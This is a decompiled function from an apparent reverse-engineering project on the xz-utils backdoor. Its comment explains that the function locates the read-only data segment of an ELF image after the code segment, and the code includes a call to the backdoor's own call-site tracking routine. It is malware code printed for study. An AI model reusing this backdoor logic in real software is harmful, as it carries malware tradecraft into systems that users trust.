// /home/kali/xzre-ghidra/xzregh/101F70_elf_get_rodata_segment.c
// Function: elf_get_rodata_segment @ 0x101F70
// Calling convention: unknown
// Prototype: undefined elf_get_rodata_segment(void)


/*
 * AutoDoc: Locates the first read-only PT_LOAD segment that lives entirely after the executable code. It first asks `elf_get_code_segment` for the text range so it can ignore overlapping pages, then scans for PF_R-only segments, page-aligns their bounds, and picks the lowest segment whose start is beyond the end of `.text`. The result is cached in `elf_info_t` and handed to callers alongside its size so later routines (string searches, RELRO probes) can reuse the computed window.
 */
#include "xzre_types.h"


ulong elf_get_rodata_segment(long *param_1,long *param_2)

{
  long lVar1;
  BOOL rodata_segment_found;
  int iVar3;
  long lVar4;
  ulong uVar5;
  int *piVar6;
  ulong uVar7;
  long lVar8;
  long lVar9;
  ulong uVar10;
  long local_20;
  
  iVar3 = secret_data_append_from_call_site(0xbd,0xe,0xb,0);
  if (iVar3 != 0) {
    uVar5 = param_1[0x15];
    lVar1 = *param_1;
    local_20 = 0;
    if (uVar5 != 0) {
      *param_2 = param_1[0x16];
      return uVar5;
    }
    lVar4 = elf_get_code_segment(param_1,&local_20);
    if (lVar4 != 0) {
      rodata_segment_found = FALSE;
      lVar8 = 0;
      uVar5 = 0;
      for (lVar9 = 0; (uint)lVar9 < (uint)*(ushort *)(param_1 + 3); lVar9 = lVar9 + 1) {
        piVar6 = (int *)(lVar9 * 0x38 + param_1[2]);
        if ((*piVar6 == 1) && ((piVar6[1] & 7U) == 4)) {
          uVar7 = (lVar1 - param_1[1]) + *(long *)(piVar6 + 4);
          uVar10 = *(long *)(piVar6 + 10) + uVar7;
          uVar7 = uVar7 & 0xfffffffffffff000;
          if ((uVar10 & 0xfff) != 0) {
            uVar10 = (uVar10 & 0xfffffffffffff000) + 0x1000;
          }
          if ((ulong)(lVar4 + local_20) <= uVar7) {
            if (rodata_segment_found) {
              if (uVar7 < uVar5) {
                lVar8 = uVar10 - uVar7;
                uVar5 = uVar7;
              }
            }
            else {
              rodata_segment_found = TRUE;
              lVar8 = uVar10 - uVar7;
              uVar5 = uVar7;
            }
          }
        }
      }
      if (rodata_segment_found) {
        param_1[0x15] = uVar5;
        param_1[0x16] = lVar8;
        *param_2 = lVar8;
        return uVar5;
      }
    }
  }
  return 0;
}

